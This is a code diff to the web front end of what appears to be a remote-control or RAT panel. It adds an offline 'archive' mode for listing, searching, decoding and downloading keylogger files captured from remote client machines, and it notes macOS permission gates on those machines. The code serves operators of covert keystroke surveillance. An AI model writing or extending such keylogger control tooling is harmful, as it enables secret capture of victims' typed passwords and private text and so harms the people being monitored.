@@ -49,6 +49,7 @@ let globalSearchCache = new Map();
 let globalSearchAbortController = null;
 let clientOs = ""; // filled from the "ready" message
 let needsPermissionGate = false; // true for darwin/mac clients
+let archiveMode = false;
 
 clientLabel.textContent = clientId;
 
@@ -136,9 +137,16 @@ function handleMessage(msg) {
 
   switch (msg.type) {
     case "ready":
+      archiveMode = msg.clientOnline === false;
       clientOs = msg.clientOs || "";
       needsPermissionGate = isMacOs(clientOs);
       console.log("Keylogger session ready, clientOs:", clientOs, "needsPermissionGate:", needsPermissionGate);
+      if (archiveMode) {
+        updateStatus("pill-offline", "Archive");
+        showFileListPanel();
+        loadArchiveList();
+        return;
+      }
       if (needsPermissionGate) {
         showPermissionGate();
       } else {
@@ -171,7 +179,10 @@ function handleMessage(msg) {
       break;
     case "status":
       if (msg.status === "offline") {
+        archiveMode = true;
         updateStatus("pill-offline", "Client Offline");
+        showFileListPanel();
+        loadArchiveList();
       }
       break;
     case "keylog_file_list":
@@ -214,19 +225,59 @@ function handleMessage(msg) {
 }
 
 function requestFileList() {
+  if (archiveMode) {
+    loadArchiveList();
+    return;
+  }
   send({ type: "keylog_list" });
 }
 
 function requestFileContent(filename) {
+  if (archiveMode) {
+    loadArchiveContent(filename);
+    return;
+  }
   send({ type: "keylog_retrieve", filename });
 }
 
 function requestClearAll() {
+  if (archiveMode) return;
   send({ type: "keylog_clear_all" });
 }
 
 function requestDeleteFile(filename) {
+  if (archiveMode) return;
   send({ type: "keylog_delete", filename });
+}
+
+async function loadArchiveList() {
+  try {
+    const res = await fetch(`/api/clients/${encodeURIComponent(clientId)}/keylogger/archive`, { credentials: "include" });
+    const data = await res.json().catch(() => ({}));
+    if (!res.ok) throw new Error(data.error || "Failed to load archive");
+    displayFileList((data.files || []).map((file) => ({ ...file, archived: true })));
+  } catch (err) {
+    console.error("Failed to load archived keylogs:", err);
+    fileList.innerHTML = `
+      <div class="text-rose-300 text-center py-8">
+        <i class="fa-solid fa-triangle-exclamation text-4xl mb-2"></i>
+        <p>Failed to load archived logs</p>
+      </div>
+    `;
+  }
+}
+
+async function loadArchiveContent(filename) {
+  try {
+    const params = new URLSearchParams({ filename });
+    const res = await fetch(`/api/clients/${encodeURIComponent(clientId)}/keylogger/archive/content?${params.toString()}`, { credentials: "include" });
+    const data = await res.json().catch(() => ({}));
+    if (!res.ok) throw new Error(data.error || "Failed to load archived file");
+    displayFileContent(data.filename || filename, data.content || "");
+  } catch (err) {
+    console.error("Failed to load archived keylog:", err);
+    window.showToast("Failed to load archived log", "error");
+  }
 }
 
 function downloadLog(filename, content) {
@@ -283,6 +334,12 @@ function displayFileList(files) {
         </div>
       </div>
       <div class="flex items-center gap-2">
+        ${file.archived ? `
+        <span class="px-2 py-1 rounded bg-yellow-900/30 border border-yellow-700 text-yellow-200 text-xs inline-flex items-center gap-1">
+          <i class="fa-solid fa-box-archive"></i>
+          Archive
+        </span>
+        ` : ""}
         <button
           class="view-log-btn px-3 py-2 rounded-lg border border-blue-700 bg-blue-900/50 hover:bg-blue-800/70 text-blue-100 flex items-center gap-2"
           data-filename="${file.name}"
@@ -297,6 +354,7 @@ function displayFileList(files) {
           <i class="fa-solid fa-download"></i>
           <span>Download</span>
         </button>
+        ${archiveMode ? "" : `
         <button
           class="delete-log-btn px-3 py-2 rounded-lg border border-red-700 bg-red-900/40 hover:bg-red-800/70 text-red-100 flex items-center gap-2"
           data-filename="${file.name}"
@@ -304,6 +362,7 @@ function displayFileList(files) {
           <i class="fa-solid fa-trash"></i>
           <span>Delete</span>
         </button>
+        `}
       </div>
     </div>
   `
@@ -560,6 +619,11 @@ async function performGlobalSearch(query) {
   }
   globalSearchAbortController = new AbortController();
 
+  if (archiveMode) {
+    await performArchivedGlobalSearch(query);
+    return;
+  }
+
   const files = Array.from(fileIndex.values());
   const lowerQuery = query.toLowerCase();
   const results = [];
@@ -629,7 +693,51 @@ async function performGlobalSearch(query) {
   displayGlobalSearchResults(results, query);
 }
 
+async function performArchivedGlobalSearch(query) {
+  globalSearchResults.innerHTML = `
+    <div class="text-slate-400 text-center py-8">
+      <i class="fa-solid fa-spinner fa-spin text-4xl mb-2"></i>
+      <p>Searching archived logs...</p>
+    </div>
+  `;
+  globalSearchStats.classList.remove("hidden");
+  globalSearchProgress.textContent = "Searching archive...";
+  globalSearchCount.textContent = "";
+
+  try {
+    const params = new URLSearchParams({ q: query });
+    const res = await fetch(`/api/clients/${encodeURIComponent(clientId)}/keylogger/archive/search?${params.toString()}`, { credentials: "include" });
+    const data = await res.json().catch(() => ({}));
+    if (!res.ok) throw new Error(data.error || "Search failed");
+    displayGlobalSearchResults(data.results || [], query);
+  } catch (err) {
+    console.error("Archived search failed:", err);
+    globalSearchResults.innerHTML = `
+      <div class="text-rose-300 text-center py-8">
+        <i class="fa-solid fa-triangle-exclamation text-4xl mb-2"></i>
+        <p>Archived search failed</p>
+      </div>
+    `;
+    globalSearchProgress.textContent = "Search failed";
+    globalSearchCount.textContent = "";
+  }
+}
+
 function loadFileContent(filename) {
+  if (archiveMode) {
+    return new Promise(async (resolve, reject) => {
+      try {
+        const params = new URLSearchParams({ filename });
+        const res = await fetch(`/api/clients/${encodeURIComponent(clientId)}/keylogger/archive/content?${params.toString()}`, { credentials: "include" });
+        const data = await res.json().catch(() => ({}));
+        if (!res.ok) throw new Error(data.error || "Failed to load archived file");
+        resolve(rot13Decode(data.content || ""));
+      } catch (err) {
+        reject(err);
+      }
+    });
+  }
+
   return new Promise((resolve, reject) => {
     let resolved = false;
     const timeout = setTimeout(() => {
@@ -749,10 +857,14 @@ requestPermissionBtn.addEventListener("click", () => {
 
 refreshBtn.addEventListener("click", () => {
   requestFileList();
-  window.showToast("Refreshing file list...", "info");
+  window.showToast(archiveMode ? "Refreshing archive..." : "Refreshing file list...", "info");
 });
 
 clearBtn.addEventListener("click", () => {
+  if (archiveMode) {
+    window.showToast("Archived logs are retained by server policy.", "info");
+    return;
+  }
   if (
     confirm(
       "Are you sure you want to clear all keylog files? This action cannot be undone."
